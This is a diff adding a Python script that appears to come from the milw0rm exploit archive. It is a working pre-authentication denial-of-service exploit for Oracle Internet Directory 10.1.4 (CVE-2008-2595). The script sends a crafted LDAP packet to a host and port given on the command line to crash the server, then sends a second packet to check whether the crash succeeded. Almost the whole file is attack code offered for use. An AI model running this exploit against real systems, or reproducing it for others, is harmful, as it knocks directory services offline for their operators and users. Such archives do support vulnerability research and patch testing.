@@ -1,0 +1,108 @@
+#!/usr/bin/python
+
+"""
+Oracle Internet Directory 10.1.4 preauthentication Denial Of Service
+
+NOTES: Under 32 bits platforms it crashes immediately. Under 64 bits it may take even hours.
+Sometimes you need 2 shoots to crash OID completely. The server "commonly" tolerates one
+shoot, but even when you only send one packet it will crash.
+
+Tested: Win2000 x86, WinXP x86, Win2003 X86_64
+
+Vulnerability found by Joxean Koret (joxeankoret [ at ] yahoo DOT es)
+
+Fixed: Oracle Critical Patch Update July 2008
+CVEID: CVE-2008-2595
+"""
+
+import sys
+import time
+import socket
+
+healthPacket = "0%\\x02\\x01\\x01c \\x04\\x00\\n\\x01\\x02\\n\\x01\\x00\\x02\\x01\\x00\\x02\\x01\\x00\\x01\\x01\\x00\\x87\\x0bobjectClass0\\x00"
+packet = "\x30\x0e\x02\x01\x01\x60\x09\x30\x01\x03\x04\x02\x44\x4e\x80\x00"
+
+def checkHealth(hostname, port):
+    print "  --> Wating 5 seconds"
+    time.sleep(5)
+    
+    print "  --> Connecting to target..."
+    socket.setdefaulttimeout(5)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((hostname, port))
+
+    try:
+        print "  --> Sending 'health' packet ..."
+        s.sendall(healthPacket)
+        print "  --> Trying to receive something..."
+        data = s.recv(1024)
+    except:
+        err = sys.exc_info()[1]
+
+        if int(err[0]) == 104:
+            print "[+] Exploits works!"
+            return
+
+    if data != "":
+        print "[!] Server is up and running :("
+    else:
+        print "[?] Server doesn't answer nothing. It works?"
+
+def oidDos(hostname, port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        print "[+] Connecting to ldap://%s:%d..." % (hostname, port)
+        s.connect((hostname, int(port)))
+
+        print "[+] Sending packet..."
+        s.sendall(packet)
+        s.close()
+
+        print "[+] Checking OID's health..."
+        checkHealth(hostname, port)
+    except:
+        print sys.exc_info()[1]
+
+def usage():
+    print "Oracle Internet Directory 10.1.4 Remote Preauthentication DOS"
+    print "Copyright (c) 2007 Joxean Koret"
+    print
+    print "Usage:"
+    print sys.argv[0],"-h<hostname> -p<port>"
+    print
+
+def main():
+    if len(sys.argv) != 3:
+        usage()
+        sys.exit(0)
+    
+    hostname = None
+    port = None
+
+    i = 0
+    for param in sys.argv:
+        i += 1
+        
+        if i == 1:
+            continue
+        
+        if param.startswith("-h"):
+            hostname = param[2:]
+        elif param.startswith("-p"):
+            port = int(param[2:])
+        else:
+            print "Unknown option '%s'" % param
+            usage()
+            sys.exit(1)
+    
+    if not hostname or not port:
+        print "Bad command line."
+        usage()
+        sys.exit(1)
+
+    oidDos(hostname, port)
+
+if __name__ == "__main__":
+    main()
+
+# milw0rm.com [2008-07-19]
